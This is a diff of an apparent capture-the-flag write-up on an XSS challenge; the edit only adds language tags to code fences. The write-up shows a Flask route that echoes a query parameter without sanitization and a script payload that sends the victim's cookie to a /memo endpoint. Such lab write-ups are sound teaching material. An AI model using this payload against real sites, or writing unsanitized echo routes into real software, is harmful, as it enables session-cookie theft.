@@ -8,7 +8,7 @@ The objective of this challenge is to launch xss attack and get the flag.
 
 ## Program structure
 
-```
+```python
 #!/usr/bin/python3
 from flask import Flask, request, render_template
 from selenium import webdriver
@@ -98,7 +98,7 @@ app.run(host="0.0.0.0", port=8000)
 
 ## Vulnerability
 
-```
+```python
 def vuln():
     param = request.args.get("param", "")
     return param
@@ -111,7 +111,7 @@ This is bad because it returns without any **sanitization**.
 
 So what I did was go to the /flag endpoint and submit this xss attack:
 
-```
+```js
 <script > document.location = '/memo?memo='+document.cookie < /script >
 ```
 
